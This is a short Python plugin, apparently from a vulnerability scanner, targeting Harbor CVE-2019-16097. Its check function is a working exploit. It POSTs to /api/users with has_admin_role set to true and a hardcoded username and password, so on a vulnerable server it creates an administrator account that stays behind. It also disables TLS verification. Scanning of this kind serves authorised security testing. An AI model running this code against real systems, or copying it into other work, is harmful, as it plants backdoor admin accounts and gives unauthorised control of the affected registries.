import requests

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Harbor 未授权创建管理员漏洞（CVE-2019-16097）
plugin_id=84
default_port_list=web_port_short



def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/api/users']
    hits = ['', 'username has already been used!']
    data = {
        "username": "opsbiu",
        "email": "ops@rrr.com",
        "realname": "opsbiu",
        "password": "123ada2q1weASD",
        "comment": "12",
        "has_admin_role": True
    }

    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.post(target, json=data, timeout=7, verify=False)
                for hit in hits:
                    if hit in response.text and response.status_code in [201, 409]:
                        output = data
                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False

